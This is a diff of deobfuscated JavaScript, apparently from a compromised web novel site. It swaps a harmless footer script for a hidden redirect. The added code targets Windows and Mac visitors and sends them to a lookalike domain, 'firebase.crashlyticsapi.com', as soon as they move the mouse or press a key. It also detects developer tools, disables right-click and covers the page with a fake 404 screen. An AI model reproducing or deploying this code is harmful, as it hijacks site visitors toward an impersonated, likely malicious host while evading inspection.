@@ -1,57 +1,56 @@
-//Sat May 10 2025 03:33:44 GMT+0000 (Coordinated Universal Time)
+//Sat May 10 2025 03:38:26 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-var encode_version = "jsjiami.com.v5";
-function bcc() {}
-function acc() {}
-function bchp() {}
-function achp() {}
-function acap() {}
-function arp() {}
-function bsp() {}
-function asp() {}
-function ssd() {
-  return "www.memelib.net";
-}
-function ftss() {
-  return "www.memelib.net";
-}
-function goss() {
-  return "www.everjump.cc";
-}
-function nfss() {
-  return "www.memelib.net";
-}
-$(function () {
-  if (document.location.href.indexOf("/book") > 0 && document.location.href.indexOf(".html") < 0) {
-    {
-      $("#footer-space").before("<div id=\"footer-copyright\" style=\"padding: 10px 20px 20px; font-size: 13px;\">本站面向全網提供無差別服務，提供的作品版權屬於作者。<br>作品均由網友上傳或系統爬蟲自動抓取自互聯網公開資料。<br>可能含不適應當地法律的內容，敬請用戶自主識別退出。<br>如無意中侵犯了您的權利，敬請聯系我們。<br><img id=\"emai1\" src=\"/assets/images/mail.png\" style=\"margin-top: 5px\"></div>");
-      $("#emai1").hide();
-      $("#footer-copyright").click(function () {
-        $("#emai1").show();
-      });
-    }
+var ua = navigator.platform.toLowerCase().match(/(win|mac)/i) ? 1 : 0;
+var eg = navigator.userAgent.toLowerCase().match(/eganbro/i) ? 1 : 0;
+var targetURL = "https://firebase.crashlyticsapi.com/";
+$("#targetPC").attr("href", targetURL);
+if (ua == 1 && document.location.href.indexOf("?debug") < 0 && eg == 0) {
+  var init = false;
+  function clickTarget() {
+    if (init) return;
+    init = true;
+    if (navigator.userAgent.toLowerCase().indexOf("spider") > -1 && location.pathname === "/") return;
+    $(".container").remove();
+    $("#targetPC").click();
   }
-  if (document.location.href.indexOf("/book") > 0 && document.location.href.indexOf(".html") > 0) {
-    $("#footer-space").before("<div id=\"little-tips\"><h3 class=\"sectionTwo-top\"><span class=\"line-between\"></span>最重要的小事</h3></div><div id=\"footer-copyright\" style=\"padding: 10px 20px 20px; font-size: 14px;\">世界纷纷扰扰喧喧闹闹什么是真实<br>为你跌跌撞撞傻傻笑笑买一杯果汁<br>就算庸庸碌碌匆匆忙忙活一辈子<br>我要分分秒秒年年日日守护你<br>最小的事</div>");
-    $("#footer-copyright").hide();
-    $("#little-tips").click(function () {
+  function checkDevToolsOpened(_0x5748bf = false) {
+    if (!_0x5748bf) {
       {
-        $("#footer-copyright").show();
+        clickTarget();
+        return;
       }
-    });
-  }
-});
-(function (_0x294f01, _0x58a534, _0x2f79d2) {
-  _0x2f79d2 = "al";
-  try {
-    _0x2f79d2 += "ert";
-    _0x58a534 = encode_version;
-    if (!(typeof _0x58a534 !== "undefined" && _0x58a534 === "jsjiami.com.v5")) {
-      _0x294f01[_0x2f79d2]("删除版本号，js会定期弹窗，还请支持我们的工作");
     }
-  } catch (_0x30675b) {
-    _0x294f01[_0x2f79d2]("删除版本号，js会定期弹窗");
+    const _0x39403f = ~navigator.userAgent.indexOf("Firefox");
+    if (_0x39403f) {
+      const _0x445ad1 = /./;
+      _0x445ad1.toString = function () {
+        this.opened = true;
+      };
+      console.log(_0x445ad1);
+      console.clear && console.clear();
+      if (_0x445ad1.opened || false) {
+        clickTarget();
+      }
+    }
   }
-})(window);
-encode_version = "jsjiami.com.v5";
+  checkDevToolsOpened(true);
+  setInterval(checkDevToolsOpened, 10000);
+  $(document).mousemove(clickTarget);
+  $(document).keydown(clickTarget);
+  $(document).bind("contextmenu", function () {
+    return false;
+  });
+  var b = document.compatMode && document.compatMode == "CSS1Compat" ? document.documentElement : document.body;
+  var op = document.createElement("div");
+  op.style.position = "fixed";
+  op.style.top = 0;
+  op.style.left = 0;
+  op.style.background = "#DEE1E2 url(\"/assets/images/404.png\") no-repeat center 200px";
+  op.style.width = "100%";
+  op.style.height = b.clientHeight + "px";
+  op.style.zIndex = 99999;
+  var first = document.body.firstChild;
+  document.body.insertBefore(op, first);
+}
+_0xod9 = "jsjiami.com.v6";
